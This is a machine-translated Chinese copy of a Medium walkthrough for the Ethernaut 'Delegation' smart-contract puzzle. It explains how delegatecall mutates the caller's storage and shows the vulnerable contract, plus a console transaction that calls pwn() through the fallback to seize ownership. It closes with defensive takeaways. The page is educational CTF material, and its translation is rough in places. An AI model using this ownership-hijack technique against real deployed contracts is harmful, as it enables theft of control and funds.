<html>
<head>
<title>Ethernaut Lvl 6 Delegation Walkthrough: How to abuse the delicate delegatecall</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Ethernaut Lvl 6委托演练:如何滥用微妙的委托调用</h1>
<blockquote>原文：<a href="https://medium.com/coinmonks/ethernaut-lvl-6-walkthrough-how-to-abuse-the-delicate-delegatecall-466b26c429e4?source=collection_archive---------2-----------------------#2018-08-22">https://medium.com/coinmonks/ethernaut-lvl-6-walkthrough-how-to-abuse-the-delicate-delegatecall-466b26c429e4?source=collection_archive---------2-----------------------#2018-08-22</a></blockquote><div><div class="ef hh hi hj hk hl"/><div class="hm hn ho hp hq"><div class=""/><div class=""><h2 id="e203" class="pw-subtitle-paragraph iq hs ht bd b ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ek translated">这是一个围绕<a class="ae ji" href="https://openzeppelin.org/" rel="noopener ugc nofollow" target="_blank">齐柏林</a>团队的<a class="ae ji" href="https://ethernaut.zeppelin.solutions/" rel="noopener ugc nofollow" target="_blank">智能合约安全拼图</a>的<a class="ae ji" rel="noopener" href="/@nicolezhu">深度系列</a>。我会给你直接的资源和你需要的关键概念来100%自己解决这些难题。</h2></div><p id="47d0" class="pw-post-body-paragraph jj jk ht jl b jm jn iu jo jp jq ix jr js jt ju jv jw jx jy jz ka kb kc kd ke hm dt translated">这个等级要求你声明你所得到的实例的所有权。</p></div><div class="ab cl kf kg hb kh" role="separator"><span class="ki bw bk kj kk kl"/><span class="ki bw bk kj kk kl"/><span class="ki bw bk kj kk"/></div><div class="hm hn ho hp hq"><h1 id="e27d" class="km kn ht bd ko kp kq kr ks kt ku kv kw iz kx ja ky jc kz jd la jf lb jg lc ld dt translated"><code class="eh le lf lg lh b">Delegatecall</code></h1><blockquote class="li"><p id="9770" class="lj lk ht bd ll lm ln lo lp lq lr ke ek translated">委托调用是一个特殊的低级函数调用，旨在<strong class="ak">从另一个(通常是库)契约</strong>中调用函数。</p></blockquote><p id="325d" class="pw-post-body-paragraph jj jk ht jl b jm ls iu jo jp lt ix jr js lu ju jv jw lv jy jz ka lw kc kd ke hm dt translated">delegatecall()的优点是，您可以保留当前调用契约的上下文。这个上下文包括它的<code class="eh le lf lg lh b">storage</code>和它的<code class="eh le lf lg lh b">msg.sender</code>、<code class="eh le lf lg lh b">msg.value</code>属性。</p><blockquote class="lx ly lz"><p id="973f" class="jj jk ma jl b jm jn iu jo jp jq ix jr mb jt ju jv mc jx jy jz md kb kc kd ke hm dt translated"><strong class="jl hu">关于存储的快速说明</strong>:以太坊在存储“槽”中存储数据，这些槽是32字节大小的槽。每次你保存一个变量到存储器，它会自动占用当前槽或序列中下一个槽的剩余空间。</p></blockquote><p id="2978" class="pw-post-body-paragraph jj jk ht jl b jm jn iu jo jp jq ix jr js jt ju jv jw jx jy jz ka kb kc kd ke hm dt translated">在下图中，契约A对契约B的<code class="eh le lf lg lh b">saveX()</code>函数进行委托调用，该函数<strong class="jl hu">最终改变了契约A的存储</strong>。让我们一步一步来:</p><figure class="mf mg mh mi fq mj fe ff paragraph-image"><div role="button" tabindex="0" class="mk ml di mm bf mn"><div class="fe ff me"><img src="../Images/3b8f87a24f20b921a43b8e20d3c1b7e0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*907YyYjEuAZCeLT9XiOA7A.png"/></div></div></figure><p id="bb9f" class="pw-post-body-paragraph jj jk ht jl b jm jn iu jo jp jq ix jr js jt ju jv jw jx jy jz ka kb kc kd ke hm dt translated">首先，契约A通过delegatecall调用<code class="eh le lf lg lh b">saveX</code>函数。<strong class="jl hu">委托调用</strong> <strong class="jl hu">用调用契约</strong>的存储覆盖契约B的存储，又名<code class="eh le lf lg lh b">Storage A</code>。</p><p id="adb9" class="pw-post-body-paragraph jj jk ht jl b jm jn iu jo jp jq ix jr js jt ju jv jw jx jy jz ka kb kc kd ke hm dt translated">接下来，执行<code class="eh le lf lg lh b">saveX</code>函数。请注意，最初，合同B将<code class="eh le lf lg lh b">bar</code>存储到存储<code class="eh le lf lg lh b">slot 0</code>。因此，当这个函数现在引用变量<code class="eh le lf lg lh b">bar</code>时，它再次查看<code class="eh le lf lg lh b">slot 0</code>。</p><p id="5746" class="pw-post-body-paragraph jj jk ht jl b jm jn iu jo jp jq ix jr js jt ju jv jw jx jy jz ka kb kc kd ke hm dt translated">然而，<code class="eh le lf lg lh b">slot 0</code>现在是指向<code class="eh le lf lg lh b">foo</code>的引用指针。因此<code class="eh le lf lg lh b">foo</code>被设置为<code class="eh le lf lg lh b">x</code>。<code class="eh le lf lg lh b">bar</code>仍在范围之外，未被触及。</p><blockquote class="lx ly lz"><p id="a713" class="jj jk ma jl b jm jn iu jo jp jq ix jr mb jt ju jv mc jx jy jz md kb kc kd ke hm dt translated"><strong class="jl hu"> tl:dr </strong>:当契约A对契约B进行委托调用时，它允许契约B自由地对其存储A进行变异。</p></blockquote></div><div class="ab cl kf kg hb kh" role="separator"><span class="ki bw bk kj kk kl"/><span class="ki bw bk kj kk kl"/><span class="ki bw bk kj kk"/></div><div class="hm hn ho hp hq"><p id="132d" class="pw-post-body-paragraph jj jk ht jl b jm jn iu jo jp jq ix jr js jt ju jv jw jx jy jz ka kb kc kd ke hm dt translated">显然，当开发人员在<strong class="jl hu">不安全的存储上下文</strong>中使用delegatecall()时，或者从恶意的库继承时，就会出现安全风险(稍后将详细介绍)。</p><blockquote class="lx ly lz"><p id="e6b6" class="jj jk ma jl b jm jn iu jo jp jq ix jr mb jt ju jv mc jx jy jz md kb kc kd ke hm dt translated"><strong class="jl hu">From</strong><a class="ae ji" href="https://solidity.readthedocs.io/en/v0.4.24/units-and-global-variables.html?highlight=delegatecall" rel="noopener ugc nofollow" target="_blank"><strong class="jl hu">Solidity docs</strong></a>:如果通过一个低级<strong class="jl hu"> delegatecall </strong>访问存储变量，那么两个契约的存储布局必须对齐，这样被调用的契约才能正确地通过名字访问调用契约的存储变量。当然，如果存储指针作为函数参数传递，就不是这种情况了，就像高级库的情况一样。</p></blockquote><p id="70b5" class="pw-post-body-paragraph jj jk ht jl b jm jn iu jo jp jq ix jr js jt ju jv jw jx jy jz ka kb kc kd ke hm dt translated">现在，利用您对delegatecall()的深入理解来获得该级别合同的所有权！</p></div><div class="ab cl kf kg hb kh" role="separator"><span class="ki bw bk kj kk kl"/><span class="ki bw bk kj kk kl"/><span class="ki bw bk kj kk"/></div><div class="hm hn ho hp hq"><figure class="mf mg mh mi fq mj fe ff paragraph-image"><div role="button" tabindex="0" class="mk ml di mm bf mn"><div class="fe ff mq"><img src="../Images/c7b341433879e88b28c5f57ab3f5ad4a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VQ6PFq6GcQIuuBDrEjGp4g.png"/></div></div></figure><h1 id="2426" class="km kn ht bd ko kp mr kr ks kt ms kv kw iz mt ja ky jc mu jd la jf mv jg lc ld dt translated">详细演练</h1><ol class=""><li id="ac73" class="mw mx ht jl b jm my jp mz js na jw nb ka nc ke nd ne nf ng dt translated">通知<code class="eh le lf lg lh b">Delegation.sol</code>对图书馆合同<code class="eh le lf lg lh b">Delegate.sol</code>做出<code class="eh le lf lg lh b">delegatecall</code></li><li id="a20b" class="mw mx ht jl b jm nh jp ni js nj jw nk ka nl ke nd ne nf ng dt translated">注意<code class="eh le lf lg lh b">Delegate.sol</code>有一个名为pwn()的公共函数，它将<code class="eh le lf lg lh b">owner</code>变量的所有权改变为调用该函数的人！</li></ol><pre class="mf mg mh mi fq nm lh nn no aw np dt"><span id="bc1f" class="nq kn ht lh b fv nr ns l nt nu">contract Delegate {<br/>    address public owner;   // Occupies slot 0<br/>    ...</span><span id="d7c9" class="nq kn ht lh b fv nv ns l nt nu">    function pwn() public {<br/>        owner = msg.sender; // Save msg.sender to slot 0<br/>    }<br/>}</span></pre><p id="1746" class="pw-post-body-paragraph jj jk ht jl b jm jn iu jo jp jq ix jr js jt ju jv jw jx jy jz ka kb kc kd ke hm dt translated">3.注意您的委托契约的<code class="eh le lf lg lh b">slot 0</code>也存储了<code class="eh le lf lg lh b">owner</code>，这正是您想要更改的变量！此外，如果您设法调用<code class="eh le lf lg lh b">Delegation.sol</code>中的fallback函数来调用<code class="eh le lf lg lh b">pwn()</code>，您将成为调用契约的所有者。</p><pre class="mf mg mh mi fq nm lh nn no aw np dt"><span id="ffad" class="nq kn ht lh b fv nr ns l nt nu">function() public {<br/>    if(delegate.delegatecall(msg.data)) {<br/>        this; <br/>    }<br/>}</span></pre><p id="3ecb" class="pw-post-body-paragraph jj jk ht jl b jm jn iu jo jp jq ix jr js jt ju jv jw jx jy jz ka kb kc kd ke hm dt translated">4.请记住，在以太坊中，您可以通过在事务中发送<code class="eh le lf lg lh b">data</code>来调用公共函数。格式如下:</p><pre class="mf mg mh mi fq nm lh nn no aw np dt"><span id="6cd2" class="nq kn ht lh b fv nr ns l nt nu">contractInstance.call(<strong class="lh hu">bytes4</strong>(<strong class="lh hu">sha3</strong>("functionName(inputType)"))</span></pre><p id="ab44" class="pw-post-body-paragraph jj jk ht jl b jm jn iu jo jp jq ix jr js jt ju jv jw jx jy jz ka kb kc kd ke hm dt translated">5.使用Remix IDE或控制台，调用<code class="eh le lf lg lh b">Delegation.sol</code>的回退功能:</p><pre class="mf mg mh mi fq nm lh nn no aw np dt"><span id="3e3f" class="nq kn ht lh b fv nr ns l nt nu">// I did so in the console, having already computed<br/>// the bytes4(sha3("pwn()"))</span><span id="d2ff" class="nq kn ht lh b fv nv ns l nt nu">await sendTransaction({<br/>  from: "0x1733d5adaccbe8057dba822ea74806361d181654",<br/>  to: "0xe3895c413b0035512c029878d1ce4d8702d02320",<br/>  data: "0xdd365b8b0000000000000000000000000000000000000000000000000000000000000000"<br/>});</span></pre><p id="8c77" class="pw-post-body-paragraph jj jk ht jl b jm jn iu jo jp jq ix jr js jt ju jv jw jx jy jz ka kb kc kd ke hm dt translated">6.<code class="eh le lf lg lh b">await contract.owner()</code>显示你现在是主人了！</p><p id="f354" class="pw-post-body-paragraph jj jk ht jl b jm jn iu jo jp jq ix jr js jt ju jv jw jx jy jz ka kb kc kd ke hm dt translated"><strong class="jl hu">提示</strong>:您可以通过Remix调试器(在Javascript VM模式下)来查看存储上下文是如何变化的！你可以在Remix调试器的<code class="eh le lf lg lh b">storage fully loaded</code>下拉菜单中找到存储槽。</p><blockquote class="li"><p id="87fb" class="lj lk ht bd ll lm ln lo lp lq lr ke ek translated">恭喜你，你现在已经再现了<a class="ae ji" href="https://blog.zeppelin.solutions/on-the-parity-wallet-multisig-hack-405a8c12e8f7" rel="noopener ugc nofollow" target="_blank">$ 3000万奇偶校验攻击背后的核心漏洞</a>！</p></blockquote></div><div class="ab cl kf kg hb kh" role="separator"><span class="ki bw bk kj kk kl"/><span class="ki bw bk kj kk kl"/><span class="ki bw bk kj kk"/></div><div class="hm hn ho hp hq"><h1 id="c35c" class="km kn ht bd ko kp kq kr ks kt ku kv kw iz kx ja ky jc kz jd la jf lb jg lc ld dt translated">关键安全要点</h1><ul class=""><li id="4c7e" class="mw mx ht jl b jm my jp mz js na jw nb ka nc ke nw ne nf ng dt translated">使用更高级的<code class="eh le lf lg lh b">call()</code>函数从库继承，特别是当你I)不需要改变契约存储和ii)不关心气体控制的时候。</li><li id="dca1" class="mw mx ht jl b jm nh jp ni js nj jw nk ka nl ke nw ne nf ng dt translated">当从一个打算改变你的契约的存储的库继承时，确保你的存储槽与库的存储槽对齐，以避免这些边缘情况。</li><li id="3f91" class="mw mx ht jl b jm nh jp ni js nj jw nk ka nl ke nw ne nf ng dt translated">对调用delegatecalls的函数进行身份验证和条件检查。</li><li id="91ed" class="mw mx ht jl b jm nh jp ni js nj jw nk ka nl ke nw ne nf ng dt translated"><a class="ae ji" href="https://solidity.readthedocs.io/en/v0.4.24/security-considerations.html" rel="noopener ugc nofollow" target="_blank">出于安全考虑，阅读坚固性文件</a>。</li></ul><h1 id="fd2d" class="km kn ht bd ko kp mr kr ks kt ms kv kw iz mt ja ky jc mu jd la jf mv jg lc ld dt translated">更多级别</h1><div class="nx ny fm fo nz oa"><a rel="noopener follow" target="_blank" href="/coinmonks/ethernaut-lvl-5-walkthrough-how-to-abuse-arithmetic-underflows-and-overflows-2c614fa86b74"><div class="ob ab ej"><div class="oc ab od cl cj oe"><h2 class="bd hu fv z el of eo ep og er et hs dt translated">Ethernaut Lvl 5令牌演练:如何滥用算术下溢和溢出</h2><div class="oh l"><h3 class="bd b fv z el of eo ep og er et ek translated">这是一个围绕齐柏林飞艇团队智能合同安全难题的深入系列。我会给你直接的资源…</h3></div><div class="oi l"><p class="bd b gc z el of eo ep og er et ek translated">medium.com</p></div></div><div class="oj l"><div class="ok l ol om on oj oo mo oa"/></div></div></a></div><div class="nx ny fm fo nz oa"><a rel="noopener follow" target="_blank" href="/coinmonks/ethernaut-lvl-7-walkthrough-how-to-selfdestruct-and-create-an-ether-blackhole-eb5bb72d2c57"><div class="ob ab ej"><div class="oc ab od cl cj oe"><h2 class="bd hu fv z el of eo ep og er et hs dt translated">Ethernaut Lvl 7力量演练-如何自毁和创建一个Ether黑洞</h2><div class="oh l"><h3 class="bd b fv z el of eo ep og er et ek translated">这是一个围绕齐柏林飞艇团队智能合同安全难题的深入系列。我们学习关键的坚固性概念来…</h3></div><div class="oi l"><p class="bd b gc z el of eo ep og er et ek translated">medium.com</p></div></div><div class="oj l"><div class="op l ol om on oj oo mo oa"/></div></div></a></div><blockquote class="li"><p id="3bad" class="lj lk ht bd ll lm oq or os ot ou ke ek translated"><a class="ae ji" href="https://coincodecap.com/?utm_source=coinmonks" rel="noopener ugc nofollow" target="_blank">直接在您的收件箱中获取最佳软件交易</a></p></blockquote><figure class="ow ox oy oz pa mj fe ff paragraph-image"><a href="https://coincodecap.com/?utm_source=coinmonks"><div class="fe ff ov"><img src="../Images/7c0b3dfdcbfea594cc0ae7d4f9bf6fcb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1168/format:webp/0*OJ-qb5G6i863msBB.png"/></div></a></figure></div></div>    
</body>
</html>